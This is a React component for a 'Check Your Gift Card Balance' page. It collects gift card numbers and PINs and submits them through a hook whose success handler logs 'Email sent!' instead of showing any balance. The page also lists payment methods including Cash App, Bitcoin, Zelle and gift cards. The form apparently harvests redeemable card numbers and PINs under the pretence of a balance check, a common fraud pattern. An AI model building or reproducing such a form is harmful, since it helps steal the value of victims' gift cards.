"use client";

import { useState } from "react";
import GiftCardItem from "./GiftCardItem";
import DenominationSelector from "./DenominationSelector";
import { GiftCard } from "./types";
import { Loader2 } from "lucide-react"; // ✅ ADD THIS
import { useGiftCardCheck } from "@/hooks/useGiftCardCheck";

interface Props {
  onSubmit: (data: {
    cards: GiftCard[];
    denomination: number | null;
  }) => Promise<any> | void;
  onCancel: () => void;
}



export default function GiftCardBalanceForm({
  onSubmit,
  onCancel,
}: Props) {
  const [cards, setCards] = useState<GiftCard[]>([
    {
      id: Date.now(),
      cardNumber: "",
      pin: "",
      noPin: false,
    },
  ]);

  const [denomination, setDenomination] = useState<number | null>(null);
  const [errors, setErrors] = useState<Record<number, string>>({});
const [loading, setLoading] = useState(false);

  const handleChange = (
    id: number,
    field: keyof GiftCard,
    value: string | boolean
  ) => {
    setCards((prev) =>
      prev.map((card) =>
        card.id === id ? { ...card, [field]: value } : card
      )
    );

    setErrors((prev) => {
      const copy = { ...prev };
      delete copy[id];
      return copy;
    });
  };

  const addCard = () => {
    setCards((prev) => [
      ...prev,
      {
        id: Date.now() + Math.random(),
        cardNumber: "",
        pin: "",
        noPin: false,
      },
    ]);
  };

  const removeCard = (id: number) => {
    setCards((prev) => prev.filter((c) => c.id !== id));

    setErrors((prev) => {
      const copy = { ...prev };
      delete copy[id];
      return copy;
    });
  };

  const validate = () => {
    const newErrors: Record<number, string> = {};

    cards.forEach((card) => {
      const number = card.cardNumber.trim();

      if (!number) {
        newErrors[card.id] = "Card number is required";
        return;
      }

      if (!/^[0-9a-zA-Z]{10,19}$/.test(number)) {
        newErrors[card.id] =
          "Card number must be 10–19 characters (letters or numbers)";
        return;
      }

      if (!card.noPin) {
        if (!card.pin.trim()) {
          newErrors[card.id] = "PIN is required";
          return;
        }

        if (!/^\d{4,8}$/.test(card.pin)) {
          newErrors[card.id] = "PIN must be 4–8 digits";
        }
      }
    });

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };
const { mutate, isPending } = useGiftCardCheck();

const handleSubmit = () => {
  const isValid = validate();
  if (!isValid) return;

  mutate(
    {
      cards,
      denomination,
    },
    {
      onSuccess: () => {
        console.log("Email sent!");
      },
      onError: () => {
        console.log("Failed");
      },
    }
  );
};
  return (
    <div className="mx-auto w-full max-w-2xl space-y-6">

      {/* HEADER */}
      <div className="text-center space-y-2">
        <h1 className="text-2xl font-semibold text-gray-900">
          Check Your Gift Card Balance
        </h1>

        <p className="text-sm text-gray-500 leading-relaxed">
          Enter one or more gift card numbers below to instantly check available balances.
        </p>
      </div>

      {/* Payment Methods */}
<div className="mt-4">
  <h4 className="font-serif text-lg mb-4">We Accept</h4>

  <div className="flex flex-wrap gap-3 text-sm">
    
    {[
      "Chime",
      "Cash App",
      "Cash (In Person Only)",
      "Bitcoin",
      "Gift Card",
      "Zelle",
      "Apple Pay",
    ].map((method) => (
      <div
        key={method}
        className="px-3 py-2 rounded-full bg-black border border-white/20 text-spa-cream/80 text-xs backdrop-blur-sm"
      >
        {method}
      </div>
    ))}

  </div>
</div>

      {/* DENOMINATION */}
      <DenominationSelector
        value={denomination}
        onChange={setDenomination}
      />

      {/* CARDS */}
      <div className="space-y-5">
        {cards.map((card, index) => (
          <GiftCardItem
            key={card.id}
            index={index}
            card={card}
            onChange={handleChange}
            onRemove={removeCard}
            canRemove={cards.length > 1}
            error={errors[card.id]}
          />
        ))}
      </div>

      {/* ADD CARD */}
      <button
        type="button"
        onClick={addCard}
        className="w-full rounded-xl border border-dashed border-gray-300 py-3 text-sm font-medium text-gray-600 transition hover:border-black hover:text-black"
      >
        + Add Another Gift Card
      </button>

      {/* ACTIONS */}
      <div className="flex items-center justify-end gap-3 pt-2">
        <button
          type="button"
          onClick={onCancel}
          className="rounded-lg px-5 py-2.5 text-sm font-medium text-gray-600 hover:bg-gray-100"
        >
          Cancel
        </button>

       <button
  type="button"
  onClick={handleSubmit}
  disabled={isPending}
  className={`rounded-lg px-5 py-2.5 text-sm font-semibold text-white transition flex items-center justify-center gap-2
    ${
      isPending
        ? "bg-gray-400 cursor-not-allowed"
        : "bg-black hover:bg-gray-900"
    }
  `}
>
  {isPending && (
    <Loader2 className="h-4 w-4 animate-spin" />
  )}

  {isPending ? "Checking..." : "Check Balance"}
</button>
      </div>
    </div>
  );


  
}